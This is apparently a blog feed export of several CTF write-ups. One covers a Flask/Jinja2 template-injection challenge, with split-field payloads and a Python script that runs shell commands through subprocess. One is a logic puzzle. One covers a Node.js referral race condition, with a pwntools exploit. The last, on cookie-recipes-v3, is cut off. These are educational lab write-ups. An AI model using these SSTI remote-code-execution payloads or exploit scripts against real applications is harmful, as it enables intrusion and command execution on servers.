since it has 3.13 running, so the other option was flask.\nFurther Recon Reflecting on the CSV export feature, we note that username and email values are injected directly into a template that generates the CSV.\nKnowing that flask uses Jinja2 as its templating engine, we can test for SSTI as follows:\nu s e r n a m e = { { 7 * 7 } } \u0026amp; e m a i l = { % i f T r u e % } A A { % e n d i f % } \u0026amp; p a s s w o r d = s o m e t h i n g We observe the following CSV:\nUSERNAME,SANITIZED MAIL,SANITIZED INSCRIPTION DATE,2025-06-01 15:31:58 MONEY,1000.0 STATS,\u0026#34;{\\\u0026#34;played\\\u0026#34;: 0, \\\u0026#34;avg_gain\\\u0026#34;: 0}\u0026#34; SANITIZED, mhmm. The app doesn\u0026rsquo;t even remove \u0026ldquo;bad\u0026rdquo; characters, it simply replaces the entire thing.\nI thought of bypassing the filters put and took quite a while testing different special characters. I tested for {% statements %}, {{ variables }} and even # line statements which all resulted in nothing but disappointment.\nBut after hours of searching, a new idea dawned on me: Do we need the payload to be in the same field? What if the backend is checking for the whole opening/closing ({{}}|{%%}) combination, but not part of it? Let\u0026rsquo;s test:\nusername={{\u0026amp;email=7*7}} The output this time is:\nUSERNAME,sm2449495(Undefined, 49) INSCRIPTION DATE,2025-06-02 17:38:13 MONEY,1000.0 STATS,\u0026#34;{\\\u0026#34;played\\\u0026#34;: 0, \\\u0026#34;avg_gain\\\u0026#34;: 0}\u0026#34; And it worked! We have an SSTI via split-field payloads.\nTask Analysis Diving deeper into this attack vector, we now know that separating our payload into two parts (username holding the first and email the second) will grant us SSTI.\nBut other than the simple {{ 7*7 }}, what can we do with this?\nWell, we have a few options, but first, let me explain how templating engines work.\n1. How Jinja2 Templates Work A template processor (also known as a template engine or parser) combines templates with data to produce documents.\nTemplates here = the CSV file format with placeholders like {{ username }}. Data = user-supplied values (like name/email), which are injected during rendering. Flask uses Jinja2 as its templating engine, which supports limited Python execution inside {{ \u0026hellip; }} and {% \u0026hellip; %} blocks.\nTemplates support Python code, and the \u0026ldquo;data model\u0026rdquo; used is Python‚Äôs object system.\nThis means if we can inject a python object (everything in python is an object btw) that can run inside the jinja2 context and give us remote code execution, we\u0026rsquo;ll be good.\nBut wait, which object is that? Is there a way to pass an object while all we control is a string inside the template.\nGood observation, we as users can\u0026rsquo;t inject objects, but we can use already existing ones, specifically, ones that flask supplies by default. Those are:\nOk you might say, I can use these objects, and?\nWell now, I\u0026rsquo;ll introduce another python feature called: reflection and introspection.\nPython Reflection \u0026amp; Introspection To break it down for you:\nEverything in Python is an object. This means that a simple string like \u0026lsquo;abc\u0026rsquo; is in fact an instance of the str object, and the latter inherits from other objects all the way to the root object: object.\nThis gives the illusion of a graph, where the root object is object, and every other object can be accessed from there, including ones like system, popen\u0026hellip;etc.\nSo by climbing the inheritance ladder, we can reach the top, and go to another bottom, that is importing a malicious builtin module, say subprocess, to achieve RCE.\nExploitation Armed with this newfound knowledge, we can exploit the vulnerability in two ways:\n1st Way: Inheritance Tree Traversal {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[INDEX](\u0026#39;cat flag.txt\u0026#39;,shell=True,stdout=-1).communicate()[0]}} This requires trial/error to find the correct index of subprocess.Popen, but since we know the python version used by the app, we can download it locally and test until figured.\n2nd Way: Using Flask\u0026rsquo;s request Object (Cleaner) {{ request.application.__globals__.__builtins__.__import__(\u0026#39;subprocess\u0026#39;).getoutput(\u0026#39;cat flag.txt\u0026#39;) }} This is cleaner and more \u0026ldquo;determinstic\u0026rdquo; if you will. The request object has access to the application method, which in turn has the builtin functions among its global variables (as with most python objects, check meta programming in python).\nI wrote another writeup here where I discuss this method further including what __globals__, __builtins__ and more mean. Refer to it for further details\nPick whichever way you like. I\u0026rsquo;ll use the second one as it doesn\u0026rsquo;t require knowledge of indices that are otherwise easy to find using the same python version as the app.\nFull exploit script import requests url = \u0026#39;https://nopsctf-casino.chals.io\u0026#39; session = requests.Session() # needed to get the session cookie ssti_payload = \u0026#34;request.application.__globals__.__builtins__.__import__(\u0026#39;subprocess\u0026#39;).getoutput(\u0026#39;cat .passwd\u0026#39;)\u0026#34; register_data = { \u0026#39;username\u0026#39;: \u0026#39;hxuu{{\u0026#39;, # you might need to change this (used...) \u0026#39;email\u0026#39;: ssti_payload + \u0026#39;}}\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;hxuu{{\u0026#39; } session.post(url + \u0026#39;/register\u0026#39;, data=register_data) login_data = { \u0026#39;username\u0026#39;: register_data[\u0026#39;username\u0026#39;], \u0026#39;password\u0026#39;: register_data[\u0026#39;password\u0026#39;] } session.post(url + \u0026#39;/login\u0026#39;, data=login_data) ## Now we\u0026#39;ll export the .csv file with the flag in it resp = session.get(url + \u0026#39;/export\u0026#39;) print(resp.text) Running this and using some grep magic (I LOVE Grep):\n‚ûú python solve.py | grep -ioP N0PS{.*} N0PS{s5T1_4veRywh3R3!!} Flag is: N0PS{s5T1_4veRywh3R3!!}\nConclusions Leaking Templating Context: Even seemingly simple CSV exports can be dangerous if they use Jinja2 without proper sanitization.\nSplit-Field Payloads: Sanitization that strips full {{ ... }} blocks can be bypassed by splitting the payload across multiple inputs.\nFlask/Jinja2 Introspection: Flask does not sandbox Jinja2 by default. By leveraging the request object, we accessed __builtins__ to import modules.\nPractical SSTI Chains: Two reliable SSTI exploitation techniques:\nInheritance-Tree Climbing: Starting from a basic object like '' to reach subprocess. Using request Object: Directly accessing the Flask app‚Äôs globals for __import__. Importance of Understanding Context: Knowing the objects available in Jinja2 context (e.g., config, request, session) is critical for SSTI exploitation.\nReferences Flask Templating (Jinja2): https://flask.palletsprojects.com/en/stable/templating/\nJinja2 Documentation: https://jinja.palletsprojects.com/en/stable/templates/\nWerkzeug Debugging: https://werkzeug.palletsprojects.com/en/stable/debug/\nitsdangerous (Flask Signing): https://itsdangerous.palletsprojects.com/en/stable/\nFlask-Unsign (Cookie Analysis): https://github.com/Paradoxis/Flask-Unsign\nPython Data Model \u0026amp; Introspection: https://docs.python.org/3/reference/datamodel.html#type.__subclasses__\nStackOverflow on Jinja2 Context:\nhttps://stackoverflow.com/questions/6145091/the-term-context-in-programming https://stackoverflow.com/questions/64149750/what-is-context-in-jinja2 ","permalink":"https://hxuu.github.io/blog/ctf/n0ps25/casinops/","summary":"A Flask-based web application echoing user-provided data via a CSV export feature. Vulnerable to SSTI","title":"N0PS25: Writeup for Web/CasinOps"},{"content":" Challenge Name: The Unseen Curse Category: Problem Solving Author: hxuu Difficulty: Tough Tags: pure logic, tough Challenge Description During a clandestine lesson in the Forbidden Forest, Professor Moody gathers the apprentices for a test of perception and logic.\n\u0026ldquo;Among these ancient trees, some bear the Phantom Mark‚Äîa dark sigil invisible to the one who stands beneath it. Each of you will be assigned a tree, but you cannot see your own. Look around: How many marks do you see?\u0026rdquo;\nAlice counts A marked trees. Bob counts B marked trees. The total number of marks, T, is either X or Y (X \u0026lt; Y), but neither knows for sure.\nThe Ritual of Declaration: Each night, the professor asks the apprentices in Turn:\n\u0026ldquo;Is the true number of marks X or Y?\u0026rdquo;\nIf an apprentice can logically deduce the answer, they must declare it at midnight. If not, the ritual repeats.\nYour Task: Given A, B, X, and Y, determine the minimum number of nights before one apprentice can conclusively declare the true count.\nInput Format:\nLine 1: Two integers A and B (0 ‚â§ A, B ‚â§ 10^9) Line 2: Two integers X and Y (1 ‚â§ X \u0026lt; Y ‚â§ 10^18) Output Format:\nA single integer: the number of nights required. The flag is forged from the answers to hidden trials, wrapped in 1ng3neer2k25{}.\nInitial Analysis This challenge presents a variation of the Muddy Children epistemic logic puzzle, cloaked in a magical narrative.\nAlice and Bob each see a number of trees, independent of one another. No one knows how many trees the other sees. The total number of trees is T which is equal to A + B Each night, they are asked if they can determine whether the true total is X or Y. If neither can be certain, the professor asks again the next night. This process continues until one of them is logically certain and makes a declaration.\nThe puzzle is fundamentally about logical inference over time, based on:\nWhat each person sees What each person knows the other sees What each person knows the other knows, and so on. This is a classic common knowledge puzzle, where the lack of an answer over time becomes new information.\nIf you feel I threw a lot of new terms, here is a good lecture about epistemic logic and types of knowledge.\nTask Analysis We are given:\nA and B: the number of trees seen by Alice and Bob. X and Y: the two possible values for the total number of marked trees. Our goal is to determine the minimum number of nights before either Alice or Bob can logically deduce whether the true (i.e. total) number of trees is X or Y.\nInput: Line 1: A B # integers: how many trees Alice and Bob see Line 2: X Y # integers: possible values for total number of trees ...etc Output (for a single test case): One integer: the minimum number of nights before one of them deduces the correct total For example, if Alice sees 12 marks, Bob sees 8 marks, and the possible totals are 18 and 20, then we want to find out how many nights pass before one of them can definitively declare that the true total is, say, 20.\nSolve The challenge is solved using a simulation that alternates deduction attempts between Alice and Bob, is simpler words: We pretend to be Alice and Bob, see how we do (can or cannot answer and why?) and reach the target night.\nHere\u0026rsquo;s the core logic, implemented in Python:\ndef nights_simulation(A=12, B=8, X=18, Y=20): if X == Y: return \u0026#34;1\u0026#34; nights = 1 atleast = 0 utmost = Y delta = Y - X while nights \u0026lt;= 30: # Alice tries to deduce if utmost - delta + 1 \u0026lt;= A \u0026lt;= utmost: return str(nights) # Alice can deduce else: utmost -= delta # Alice fails, Bob gains knowledge # Bob tries to deduce if atleast \u0026lt;= B \u0026lt;= atleast + delta - 1: return str(nights) # Bob can deduce else: atleast += delta # Bob fails, Alice gains knowledge nights += 1 return \u0026#34;-1\u0026#34; # No conclusion reached within 30 nights How It Works: At the 1st night, Alice is asked whether she sees 18 or 20 trees. Had she seen 19 or 20, she would\u0026rsquo;ve answered 20, but she only sees 12, so she passes.\nBob, having known that Alice\u0026rsquo;s passing results in her seeing at most 18 trees, would be able to answer if he sees 0 or 1 trees in total (0+18 = 18, 1+17 = 18 =\u0026gt; answer is 18)\nAt the 2nd night, Alice is asked again. Now she knows bob couldn\u0026rsquo;t have seen 0 or 1, he must\u0026rsquo;ve seen AT LEAST 2. Armed with this knowledge, she would\u0026rsquo;ve answered 20 if she had either 18 or 17 (but not 16!). Alice sees 12 though, so she passes.\nBob, having known that Alice\u0026rsquo;s passing results in her seeing at most 16 trees, would be able to answer if he sees 2 or 3 trees in total (2+16 = 18, 3+15 = 18 =\u0026gt; answer is 18)\nDo you notice the pattern? Here it is:\nEach night, the current player sees if he can answer\nThe passing (failure to declare) of one player is an implicit message to the other that eliminates certain worlds from existence (world where Alice has 19 or 20 in night 1).\nOver time, this silent communication builds up into logical certainty, and one player can make a declaration.\nutmost and atleast represent shrinking bounds for each player\u0026rsquo;s certainty window.\nOver time, the failure to deduce becomes information ‚Äî if Alice doesn\u0026rsquo;t speak up on night 1, Bob learns something new about what Alice must have seen.\nEventually, someone can eliminate one possibility and declare the truth.\nBatch Evaluation and Flag Generation To solve multiple test cases and derive the final flag, the script reads inputs in pairs from a file (the-unseen-curse.txt):\nif __name__ == \u0026#34;__main__\u0026#34;: with open(\u0026#34;../files/the-unseen-curse.txt\u0026#34;) as f: lines = [line.strip() for line in f if line.strip()] assert len(lines) % 2 == 0 results = [] for i in range(0, len(lines), 2): A, B = map(int, lines[i].split()) X, Y = map(int, lines[i + 1].split()) if X \u0026gt; Y: X, Y = Y, X result = new_reasoning_solver(A, B, X, Y) results.append(result) print(\u0026#34;flag:\u0026#34;, f\u0026#34;1ng3neer2k25{{{\u0026#39;\u0026#39;.join(results)}}}\u0026#34;) Each result becomes a digit in the final flag. then the final flag is: 1ng3neer2k25{5211322412311434132}\nSummary This challenge masterfully blends deductive logic, iterative inference, and a compelling magical narrative. It requires understanding how knowledge propagates in rounds and how silence becomes information. By modeling the interactions over successive nights, we compute the precise moment someone can break the uncertainty and solve the puzzle.\n","permalink":"https://hxuu.github.io/blog/ctf/ingeneer25/the-unseen-curse/","summary":"This challenge masterfully blends deductive logic, iterative inference, and a compelling magical narrative. It requires understanding how knowledge propagates in rounds and how silence becomes information. By modeling the interactions over successive nights, we compute the precise moment someone can break the uncertainty and solve the puzzle.","title":"Ingeneer25 (Problem Solving) - The Unseen Curse"},{"content":"Challenge Overview CTF: Dice CTF 2025 Challenge: pyramid Category: Web Exploitation Points: 138 (58 solves) Description: Would you like to buy some supplements? Source code: index.js TL;DR This challenge involved exploiting how Node.js handles streams and events in an HTTP server. By understanding the event-driven nature of Node.js, especially how request.on('data') and request.on('end') behave, we manipulated the request flow. An attacker can self-refer and quickly multiply referrals, accumulating the required 100 billion coins to purchase the flag. This bypasses the need for real users.\nInitial Analysis At first glance, this looks like your classic referral-based app: users can register, refer others, and exchange referrals for coins. Once you have enough coins, you can buy the flag. Simple enough.\nChecking the source code:\nconst express = require(\u0026#39;express\u0026#39;) const crypto = require(\u0026#39;crypto\u0026#39;) const app = express() const css = ` \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/axist@latest/dist/axist.min.css\u0026#34; \u0026gt; ` const users = new Map() const codes = new Map() const random = () =\u0026gt; crypto.randomBytes(16).toString(\u0026#39;hex\u0026#39;) const escape = (str) =\u0026gt; str.replace(/\u0026lt;/g, \u0026#39;\u0026amp;lt;\u0026#39;) const referrer = (code) =\u0026gt; { if (code \u0026amp;\u0026amp; codes.has(code)) { const token = codes.get(code) if (users.has(token)) { return users.get(token) } } return null } app.use((req, _res, next) =\u0026gt; { const token = req.headers.cookie?.split(\u0026#39;=\u0026#39;)?.[1] if (token) { req.token = token if (users.has(token)) { req.user = users.get(token) } } next() }) app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.type(\u0026#39;html\u0026#39;) if (req.user) { res.end(` ${css} \u0026lt;h1\u0026gt;Account: ${escape(req.user.name)}\u0026lt;/h1\u0026gt; You have \u0026lt;strong\u0026gt;${req.user.bal}\u0026lt;/strong\u0026gt; coins. You have referred \u0026lt;strong\u0026gt;${req.user.ref}\u0026lt;/strong\u0026gt; users. \u0026lt;hr\u0026gt; \u0026lt;form action=\u0026#34;/code\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Generate referral code\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;form action=\u0026#34;/cashout\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt; Cashout ${req.user.ref} referrals \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;form action=\u0026#34;/buy\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Purchase flag\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; `) } else { res.end(` ${css} \u0026lt;h1\u0026gt;Register\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/new\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Name\u0026#34; required\u0026gt; \u0026lt;input name=\u0026#34;refer\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Referral code (optional)\u0026#34; \u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Register\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; `) } }) app.post(\u0026#39;/new\u0026#39;, (req, res) =\u0026gt; { const token = random() const body = [] req.on(\u0026#39;data\u0026#39;, Array.prototype.push.bind(body)) req.on(\u0026#39;end\u0026#39;, () =\u0026gt; { const data = Buffer.concat(body).toString() const parsed = new URLSearchParams(data) const name = parsed.get(\u0026#39;name\u0026#39;)?.toString() ?? \u0026#39;JD\u0026#39; const code = parsed.get(\u0026#39;refer\u0026#39;) ?? null // referrer receives the referral const r = referrer(code) if (r) { r.ref += 1 } users.set(token, { name, code, ref: 0, bal: 0, }) }) res.header(\u0026#39;set-cookie\u0026#39;, `token=${token}`) res.redirect(\u0026#39;/\u0026#39;) }) app.get(\u0026#39;/code\u0026#39;, (req, res) =\u0026gt; { const token = req.token if (token) { const code = random() codes.set(code, token) res.type(\u0026#39;html\u0026#39;).end(` ${css} \u0026lt;h1\u0026gt;Referral code generated\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your code: \u0026lt;strong\u0026gt;${code}\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; `) return } res.end() }) // referrals translate 1:1 to coins // you receive half of your referrals as coins // your referrer receives the other half as kickback // // if your referrer is null, you can turn all referrals into coins app.get(\u0026#39;/cashout\u0026#39;, (req, res) =\u0026gt; { if (req.user) { const u = req.user const r = referrer(u.code) if (r) { [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2] } else { [u.ref, u.bal] = [0, u.bal + u.ref] } } res.redirect(\u0026#39;/\u0026#39;) }) app.get(\u0026#39;/buy\u0026#39;, (req, res) =\u0026gt; { if (req.user) { const user = req.user if (user.bal \u0026gt; 100_000_000_000) { user.bal -= 100_000_000_000 res.type(\u0026#39;html\u0026#39;).end(` ${css} \u0026lt;h1\u0026gt;Successful purchase\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;${process.env.FLAG}\u0026lt;/p\u0026gt; `) return } } res.type(\u0026#39;html\u0026#39;).end(` ${css} \u0026lt;h1\u0026gt;Not enough coins\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; `) }) app.listen(3000) Fairly simple Express.js app with a referral system. Here\u0026rsquo;s how it works:\nReferral Codes:\nRegistered users can generate their own referral codes. When new users sign up using those codes, it adds to the referrer‚Äôs count. Earning Coins:\nUsers earn coins by referring others. They get half of the coins from their referrals, and the person who referred them gets the other half. Cashout:\nUsers can ‚Äúcash out‚Äù their referrals for coins. If they don‚Äôt have a referrer, they get all the coins from their referrals. Buying the Flag:\nOnce users collect 100 billion coins, they can buy the flag and get it displayed on the page. Tokens are stored in cookies, and the whole thing runs on a basic event-driven system.\nUntil now everything seems normal, but few things didn‚Äôt sit right.\nThe first was the cashout mechanic. The rules were odd. Here‚Äôs what it says in the code:\n// referrals translate 1:1 to coins // you receive half of your referrals as coins // your referrer receives the other half as kickback // // if your referrer is null, you can turn all referrals into coins That last line is where I paused:\n‚ÄúIf your referrer is null, you can turn all referrals into coins.‚Äù\nThis introduces an interesting asymmetry. Normally, a referral rewards two people ‚Äî you and your referrer ‚Äî but if you\u0026rsquo;re a root user (with no referrer), you get everything. That‚Äôs a subtle but powerful difference.\nSo naturally, I wondered: Can I abuse this difference to multiply referrals without involving real users?\nIt wasn‚Äôt clear how at first ‚Äî but the mechanism definitely seemed ripe for something unintended.\nThe second is the use of req.on(). I\u0026rsquo;ve never used those to handle user data before.\nTask Analysis When I started tackling the challenge, I tried going down the intended route. The issue? You need an astronomical number of referrals to reach the required 100_000_000_000 coins. That\u0026rsquo;s simply not practical.\nLet\u0026rsquo;s focus on this code:\n// referrals translate 1:1 to coins // you receive half of your referrals as coins // your referrer receives the other half as kickback // // if your referrer is null, you can turn all referrals into coins app.get(\u0026#39;/cashout\u0026#39;, (req, res) =\u0026gt; { if (req.user) { const u = req.user const r = referrer(u.code) if (r) { [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2] } else { [u.ref, u.bal] = [0, u.bal + u.ref] } } res.redirect(\u0026#39;/\u0026#39;) }) Basically, referrals get split 50/50 between you and whoever referred you. But here‚Äôs the catch: if you can make your own user refer themselves ‚Äî that is, make r = u ‚Äî the logic breaks in your favor.\nLet\u0026rsquo;s do some math:\n[u.ref, u.ref, u.bal] = [0, u.ref + u.ref / 2, u.bal + u.ref / 2] Which simplifies to this:\nu.ref = 1.5 * u.ref // (effectively grows each time) u.bal += 0.5 * u.ref // (from before) So each time you /cashout, your referral count increases by 50%. That means faster growth. After a few iterations, you‚Äôll hit the required balance quickly ‚Äî no need to invite real users.\nBut the real question is: how do we refer ourselves?\nThe app ties users and their referral codes to tokens, and tokens are only set after user registration. That means you shouldn‚Äôt be able to refer yourself during registration\u0026hellip; or can you?\nTurns out, this isn‚Äôt your usual Express app. While it uses Express for routing, the actual user creation is done by listening to Node.js core HTTP events, particularly the \u0026lsquo;data\u0026rsquo; and \u0026rsquo;end\u0026rsquo; events on the request object.\nThat means the user is only fully created once the 'end' event is emitted ‚Äî after the request body is fully received.\nThis behavior falls under what\u0026rsquo;s called event-driven programming ‚Äî basically, code execution is triggered by events like \u0026ldquo;data received\u0026rdquo; or \u0026ldquo;request ended.\u0026rdquo; In Node.js, the core http module lets you manually handle these events using req.on(...).\nExpress still uses Node‚Äôs HTTP module under the hood. You can read more about event-driven programming here\nBut here‚Äôs where it gets interesting: Express handlers are called as soon as headers are received, even if the body isn‚Äôt sent yet. We can prove this with a small demo:\nCreate a small ExpressJS application: npm init npm install express const express = require(\u0026#39;express\u0026#39;); const app = express(); app.post(\u0026#39;/test\u0026#39;, (req, res) =\u0026gt; { console.log(\u0026#39;Route handler triggered!\u0026#39;); res.send(\u0026#39;ok\u0026#39;); }); app.listen(3000, () =\u0026gt; console.log(\u0026#39;Listening on http://localhost:3000\u0026#39;)); Now send just the headers (not the full body) using this script: #!/usr/bin/env bash ( echo -e \u0026#34;POST /test HTTP/1.1\\r\u0026#34;; echo -e \u0026#34;Host: localhost\\r\u0026#34;; echo -e \u0026#34;Content-Length: 999\\r\u0026#34;; sleep 5; # DO NOT send the final blank line that terminates headers, wait and see that server hangs echo -e \u0026#34;\\r\u0026#34;; # you should see a response once this happens ) | nc localhost 3000 See. The server doesn‚Äôt wait for the full body to call the route logic. That\u0026rsquo;s because Express registers handlers early ‚Äî and starts sending back a response early too.\nWhy does that matter?\nBecause in our vulnerable app, the response sets a cookie (token=...) before the request finishes. This will give us a small window to do what we want with the token in the response header.\nExploitation Armed with this newfound knowledge, we know exactly what we need to do: We need to register a user that self-refers himself and cashes out as many times as needed for his account balance to reach the target 100_000_000_000.\nWe exploit the fact that, in Node\u0026rsquo;s HTTP module, the response headers are sent once the request headers are transmitted, but before the request body is fully processed (no \u0026ldquo;end\u0026rdquo; event triggered yet). This allows us to retrieve the token from the response and append it to the rest of the request, enabling the creation of our malicious user.\nthe name field in the request is not necessary.\nAlright, let\u0026rsquo;s get to business. I\u0026rsquo;ll be using pwntools to deliver the attack.\nCreate a TCP connection with the server and keep it alive so we can receive the response headers: from pwn import * # Creates a TCP or UDP-connection to a remote host. It supports both IPv4 and IPv6. connection = remote(\u0026#39;localhost\u0026#39;, 3000) # Send an HTTP request without closing (server doesn\u0026#39;t emit \u0026#39;end\u0026#39; event) connection.send( ( b\u0026#39;POST /new HTTP/1.1\\r\\n\u0026#39; b\u0026#39;Host: localhost\\r\\n\u0026#39; b\u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39; b\u0026#39;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#39; b\u0026#39;\\r\\n\u0026#39; ) ) # Do simple string manipulation to extract the token from the response headers token = connection.recv().decode().split(\u0026#39;token=\u0026#39;)[1].split(\u0026#39;\\r\\n\u0026#39;)[0] I used Transfer-Encoding: chunked because I didn't bother calculating the length of the code. You can use Content-Length header just fine Nice, we got the token (our user identifier). Now, let\u0026rsquo;s create a code that refers to this user: code = requests.get(\u0026#39;http://localhost:3000/code\u0026#39;, cookies={\u0026#39;token\u0026#39;: token}).text.split(\u0026#39;\u0026lt;strong\u0026gt;\u0026#39;)[1].split(\u0026#39;\u0026lt;/strong\u0026gt;\u0026#39;)[0] Complete the request with the chunked data, including refer=code: code_chunk = b\u0026#39;refer=\u0026#39; + code.encode() # Complete request to create a self-referring account connection.send( ( f\u0026#39;{len(code_chunk):X}\\r\\n\u0026#39;.encode() + code_chunk + b\u0026#39;\\r\\n\u0026#39; + b\u0026#39;0\u0026#39; b\u0026#39;\\r\\n\u0026#39; # end of the zero chunk b\u0026#39;\\r\\n\u0026#39; # end of the whole body ) ) This will trigger the \u0026ldquo;end\u0026rdquo; event and create a self-referring user. The next steps are straightforward:\n# Create an account that increase our original account\u0026#39;s refer count (0 * anything = 0 innit xD) requests.post(\u0026#39;http://localhost:3000/new\u0026#39;, data={\u0026#39;refer\u0026#39;:code}) # Increase the ref count by 1.5 for _ in range(70): requests.get(\u0026#39;http://localhost:3000/cashout\u0026#39;, cookies={\u0026#39;token\u0026#39;: token}) # Buy the FLAG flag = requests.get(\u0026#39;http://localhost:3000/buy\u0026#39;, cookies={\u0026#39;token\u0026#39;: token}).text print(flag) Putting everything together, the complete script is as follows:\n#!/usr/bin/env python3 import requests from pwn import * # Creates a TCP or UDP-connection to a remote host. It supports both IPv4 and IPv6. connection = remote(\u0026#39;localhost\u0026#39;, 3000) # Send an HTTP request without closing (server doesn\u0026#39;t emit \u0026#39;end\u0026#39; event) connection.send( ( b\u0026#39;POST /new HTTP/1.1\\r\\n\u0026#39; b\u0026#39;Host: localhost\\r\\n\u0026#39; b\u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39; b\u0026#39;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#39; b\u0026#39;\\r\\n\u0026#39; ) ) token = connection.recv().decode().split(\u0026#39;token=\u0026#39;)[1].split(\u0026#39;\\r\\n\u0026#39;)[0] # Generate chunks to send code = requests.get(\u0026#39;http://localhost:3000/code\u0026#39;, cookies={\u0026#39;token\u0026#39;: token}).text.split(\u0026#39;\u0026lt;strong\u0026gt;\u0026#39;)[1].split(\u0026#39;\u0026lt;/strong\u0026gt;\u0026#39;)[0] code_chunk = b\u0026#39;refer=\u0026#39; + code.encode() # Complete request to create a self-referring account connection.send( ( f\u0026#39;{len(code_chunk):X}\\r\\n\u0026#39;.encode() + code_chunk + b\u0026#39;\\r\\n\u0026#39; + b\u0026#39;0\u0026#39; b\u0026#39;\\r\\n\u0026#39; # end of the zero chunk b\u0026#39;\\r\\n\u0026#39; # end of the whole body (not necessary?) ) ) # Create an account that increase our original account\u0026#39;s refer count requests.post(\u0026#39;http://localhost:3000/new\u0026#39;, data={\u0026#39;refer\u0026#39;:code}) # Increase the ref count by 1.5 for _ in range(70): requests.get(\u0026#39;http://localhost:3000/cashout\u0026#39;, cookies={\u0026#39;token\u0026#39;: token}) # Buy the FLAG flag = requests.get(\u0026#39;http://localhost:3000/buy\u0026#39;, cookies={\u0026#39;token\u0026#39;: token}).text.split(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;)[1].split(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;)[0] print(flag) Flag is: dice{007227589c05e703}\nConclusions What we learned in this challenge:\nHTTP request body handling is asynchronous Race conditions in Express route handlers Self-referral logic abuse References If you\u0026rsquo;re interested to learn more, here is a list of useful references:\nEvent-driven programming - Wikipedia Node.js Events API Understanding request.on(...) in Node.js ‚Äì Stack Overflow MDN: RegExp - Regular Expressions in JavaScript MDN: Map.prototype.has MDN: Map.prototype.get Node.js http.ClientRequest Class YouTube: Node.js Stream Crash Course Difference between res.end() and res.send() ‚Äì Stack Overflow RFC 7230 ‚Äì Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing ","permalink":"https://hxuu.github.io/blog/ctf/dice25/pyramid/","summary":"Exploited Node.js streams to self-refer, bypassing real users for coins.","title":"Dice25: Writeup for web/pyramid"},{"content":"Challenge Overview CTF: Dice CTF 2025 Challenge: cookie-recipes-v3 Category: Web Exploitation Points: 105 (459 solves) Description: Mmmmmmm\u0026hellip; Source code: index.js TL;DR In the cookie-recipes-v3 challenge, ExpressJS\u0026rsquo;s use of the qs library for query string parsing allows bypassing a length check on the number parameter. By sending a query like number[]=1000000000, which qs parses into an array, we exploit JavaScript\u0026rsquo;s type coercion and array behavior to pass the check. The exploit manipulates the Number() function‚Äôs implicit conversion to retrieve the flag.\nInitial Analysis At first glance, the challenge presents itself as a simple cookie counter application. Three buttons to bake cookies in different amounts, a disabled button for a larger batch, and one final button to deliver cookies.\nThe UI is minimal, but the disabling of Super cookie recipe (makes a million) button screamed a hint for me. Let\u0026rsquo;s check the source code:\nconst express = require(\u0026#39;express\u0026#39;) const app = express() const cookies = new Map() app.use((req, res, next) =\u0026gt; { const cookies = req.headers.cookie const user = cookies?.split(\u0026#39;=\u0026#39;)?.[1] if (user) { req.user = user } else { const id = Math.random().toString(36).slice(2) res.setHeader(\u0026#39;set-cookie\u0026#39;, `user=${id}`) req.user = id } next() }) app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const count = cookies.get(req.user) ?? 0 res.type(\u0026#39;html\u0026#39;).send(` \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://fonts.xz.style/serve/inter.css\u0026#34;\u0026gt; \u0026lt;div\u0026gt;You have \u0026lt;span\u0026gt;${count}\u0026lt;/span\u0026gt; cookies\u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;basic\u0026#34;\u0026gt;Basic cookie recipe (makes one)\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button id=\u0026#34;advanced\u0026#34;\u0026gt;Advanced cookie recipe (makes a dozen)\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button disabled\u0026gt;Super cookie recipe (makes a million)\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button id=\u0026#34;deliver\u0026#34;\u0026gt;Deliver cookies\u0026lt;/button\u0026gt; \u0026lt;script src=\u0026#34;/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; `) }) app.get(\u0026#39;/script.js\u0026#39;, (_req, res) =\u0026gt; { res.type(\u0026#39;js\u0026#39;).send(` const basic = 